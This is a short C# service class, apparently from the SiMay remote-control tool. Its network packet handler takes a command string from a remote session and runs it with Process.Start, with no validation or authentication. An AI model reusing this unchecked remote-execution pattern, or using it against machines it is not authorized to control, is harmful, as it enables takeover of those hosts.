using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SiMay.Service.Core
{
    public class ShellSimpleService : RemoteSimpleServiceBase
    {
        [PacketHandler(MessageHead.S_SIMPLE_EXE_SHELL)]
        public void ExecuteShell(SessionProviderContext session)
        {
            var cmd = session.GetMessage().ToUnicodeString();
            Process.Start(cmd);
        }
    }
}
